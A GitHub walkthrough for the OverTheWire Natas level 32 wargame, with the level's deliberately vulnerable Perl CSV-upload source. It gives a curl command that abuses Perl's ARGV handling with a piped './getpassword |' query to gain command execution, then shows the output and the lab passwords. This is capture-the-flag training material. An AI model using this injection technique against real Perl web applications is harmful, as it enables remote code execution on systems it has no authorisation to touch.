# Natas32 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas32
Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
URL:      http://natas32.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Pretty much the same level as last one but you need to read `./getpassword%20|`.

  ```
  /var/www/natas/natas32/index-source.pl

  #!/usr/bin/perl
  use CGI;
  $ENV{'TMPDIR'}="/var/www/natas/natas32/tmp/";
  
  print <<END;
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <!-- Bootstrap -->
  <link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
  <script src="sorttable.js"></script>
  </head>
  <script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
  
  <!-- 
      morla/10111 
      shouts to Netanel Rubin    
  -->
  
  <style>
  #content {
      width: 900px;
  }
  .btn-file {
      position: relative;
      overflow: hidden;
  }
  .btn-file input[type=file] {
      position: absolute;
      top: 0;
      right: 0;
      min-width: 100%;
      min-height: 100%;
      font-size: 100px;
      text-align: right;
      filter: alpha(opacity=0);
      opacity: 0;
      outline: none;
      background: white;
      cursor: inherit;
      display: block;
  }
  
  </style>
  
  
  <h1>natas32</h1>
  <div id="content">
  END
  
  my $cgi = CGI->new;
  if ($cgi->upload('file')) {
      my $file = $cgi->param('file');
      print '<table class="sortable table table-hover table-striped">';
      $i=0;
      while (<$file>) {
          my @elements=split /,/, $_;
  
          if($i==0){ # header
              print "<tr>";
              foreach(@elements){
                  print "<th>".$cgi->escapeHTML($_)."</th>";   
              }
              print "</tr>";
          }
          else{ # table content
              print "<tr>";
              foreach(@elements){
                  print "<td>".$cgi->escapeHTML($_)."</td>";   
              }
              print "</tr>";
          }
          $i+=1;
      }
      print '</table>';
  }
  else{
  print <<END;
  
  <form action="index.pl" method="post" enctype="multipart/form-data">
      <h2> CSV2HTML</h2>
      <br>
      We all like .csv files.<br>
      But isn't a nicely rendered and sortable table much cooler?<br>
      <br>
      This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
      <br><br>
      Select file to upload:
      <span class="btn btn-default btn-file">
          Browse <input type="file" name="file">
      </span>    
      <input type="submit" value="Upload" name="submit" class="btn">
  </form> 
  END
  }
  
  print <<END;
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  END
  ```

- Payload:

  ```
  curl -H 'Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==' -H 'Content-Type: multipart/form-data; boundary=123abc' -d $'--123abc\r\nContent-Disposition: form-data; name="file";\r\nContent-Type: text/plain\r\n\r\nARGV\r\n--123abc\r\nContent-Disposition: form-data; name="file"; filename="ttt.csv"\r\nContent-Type: application/octet-stream\r\n\r\n1,2,3\r\n\r\n\r\n--123abc\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n---123abc--\r\n'  'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|'
  ```

- Output:

  ```
  $ curl -H 'Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==' -H 'Content-Type: multipart/form-data; boundary=123abc' -d $'--123abc\r\nContent-Disposition: form-data; name="file";\r\nContent-Type: text/plai
  n\r\n\r\nARGV\r\n--123abc\r\nContent-Disposition: form-data; name="file"; filename="ttt.csv"\r\nContent-Type: application/octet-stream\r\n\r\n1,2,3\r\n\r\n\r\n--123abc\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n--
  -123abc--\r\n'  'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|'
  
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <!-- Bootstrap -->
  <link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
  <script src="sorttable.js"></script>
  </head>
  <script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
  <!--  
      morla/10111  
      shouts to Netanel Rubin     
  -->
  <style>
  #content {
      width: 900px;
  }
  .btn-file {
      position: relative;
      overflow: hidden;
  }
  .btn-file input[type=file] {
      position: absolute;
      top: 0;
      right: 0;
      min-width: 100%;
      min-height: 100%;
      font-size: 100px;
      text-align: right;
      filter: alpha(opacity=0);
      opacity: 0;
      outline: none;
      background: white;
      cursor: inherit;
      display: block;
  }
  
  </style>
  <h1>natas32</h1>
  <div id="content">
  <table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
  </th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

---

## 🏁 Password for the next level

`Password for natas33 is: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
